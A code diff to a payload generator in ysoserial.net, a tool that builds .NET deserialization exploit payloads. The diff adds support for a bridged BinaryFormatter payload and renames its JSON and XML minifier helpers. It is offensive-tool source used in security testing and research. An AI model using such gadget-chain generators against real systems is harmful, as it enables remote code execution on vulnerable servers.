@@ -48,10 +48,24 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived , "Not in GAC"};
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            IGenerator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                IGenerator generator = new TextFormattingRunPropertiesGenerator();
+                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+            }
+
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
@@ -99,11 +113,11 @@ namespace ysoserial.Generators
                     
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = JsonMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                        payload = JsonHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                     }
                     else
                     {
-                        payload = JsonMinifier.Minify(payload, null, null);
+                        payload = JsonHelper.Minify(payload, null, null);
                     }
                 }
 
@@ -147,11 +161,11 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = XmlMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                        payload = XmlHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                     }
                     else
                     {
-                        payload = XmlMinifier.Minify(payload, null, null);
+                        payload = XmlHelper.Minify(payload, null, null);
                     }
                 }
 
@@ -210,11 +224,11 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = XmlMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
+                        payload = XmlHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                     }
                     else
                     {
-                        payload = XmlMinifier.Minify(payload, null, null);
+                        payload = XmlHelper.Minify(payload, null, null);
                     }
                 }
 
@@ -263,11 +277,11 @@ namespace ysoserial.Generators
                 {
                     if (inputArgs.UseSimpleType)
                     {
-                        payload = XmlMinifier.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, FormatterType.SoapFormatter);
+                        payload = XmlHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, FormatterType.SoapFormatter);
                     }
                     else
                     {
-                        payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
+                        payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                     }
                 }
 
